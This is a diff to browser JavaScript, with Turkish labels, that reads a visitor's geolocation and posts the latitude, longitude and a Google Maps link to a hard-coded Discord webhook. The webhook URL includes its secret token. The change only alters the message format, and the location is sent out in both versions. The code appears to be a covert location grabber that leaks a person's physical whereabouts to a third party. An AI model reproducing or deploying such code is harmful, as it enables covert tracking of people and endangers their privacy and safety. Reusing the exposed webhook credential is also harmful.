@@ -21,21 +21,12 @@
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             var mapLink = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
-
-            var locationEmbed = {
-                title: "Kullanıcının Konumu",
-                description: "Kullanıcının konum bilgisi:",
-                fields: [
-                    { name: "Latitude:", value: latitude, inline: true },
-                    { name: "Longitude:", value: longitude, inline: true },
-                    { name: "Harita Linki:", value: `[Google Maps](${mapLink})` }
-                ]
-            };
+            var locationText = 'Kullanıcının Konumu:\nLatitude: ' + latitude + '\nLongitude: ' + longitude + '\n\n[Google Maps](' + mapLink + ')';
 
             var discordWebhookUrl = 'https://discord.com/api/webhooks/1197143406909079603/NUuX5YJh-7FilsYGnKTcZOdaibciKTyTd8EyWpGzJk1gcKAgJtOsfcYoyqC-OttBeRj8'; // Discord Webhook URL'si
 
             var payload = {
-                embeds: [locationEmbed]
+                content: locationText
             };
 
             fetch(discordWebhookUrl, {
